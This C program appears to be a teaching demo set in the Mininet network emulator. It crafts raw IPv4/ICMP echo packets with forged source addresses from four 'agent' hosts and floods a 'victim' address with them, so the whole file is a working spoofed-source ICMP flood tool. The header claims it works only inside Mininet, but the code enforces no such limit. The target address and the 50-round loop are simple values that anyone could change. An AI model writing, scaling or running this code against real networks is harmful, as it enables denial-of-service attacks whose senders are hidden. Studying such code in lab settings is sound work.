/*
 * Works only inside Mininet. 
 * Shows packet crafting, spoofed agents, ICMP structure.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

// ICMP + IP checksum
unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short out;

    while (len > 1)
    {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    out = ~sum;
    return out;
}

int main()
{
    int sockfd;

    // Spoofed agent IPs (h3–h6 in Mininet)
    char *agents[] = {
        "10.0.0.2",
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5"
    };

    int num_agents = sizeof(agents) / sizeof(agents[0]);

    // Victim IP (h2 in Mininet)
    char victim[] = "10.0.0.6";

    printf("ICMP Flood — Safe Demo\n");
    printf("Spoofed Agents: %d\n", num_agents);

    // Raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0)
    {
        perror("socket");
        return 1;
    }

    int on = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(victim);

    // Allocate packet buffer
    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr *iph = (struct iphdr *)packet;
    struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));

    int packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr);

    printf("Starting ICMP flood demonstration...\n");

    for (int round = 1; round <= 50; round++) // small safe number
    {
        for (int i = 0; i < num_agents; i++)
        {
            memset(packet, 0, sizeof(packet));

            // IP Header
            iph->ihl = 5;
            iph->version = 4;
            iph->ttl = 64;
            iph->protocol = IPPROTO_ICMP;
            iph->tot_len = htons(packet_len);
            iph->saddr = inet_addr(agents[i]);  // SPOOFED source
            iph->daddr = inet_addr(victim);
            iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

            // ICMP Header
            icmph->type = ICMP_ECHO; // 8
            icmph->code = 0;
            icmph->un.echo.id = htons(1000 + round);
            icmph->un.echo.sequence = htons(i);
            icmph->checksum = checksum(icmph, sizeof(struct icmphdr));

            // Send packet
            sendto(sockfd,
                   packet,
                   packet_len,
                   0,
                   (struct sockaddr *)&dest,
                   sizeof(dest));

            printf("Round %d: Sent ICMP Echo from %s → %s\n",
                   round, agents[i], victim);
        }
    }

    close(sockfd);
    return 0;
}

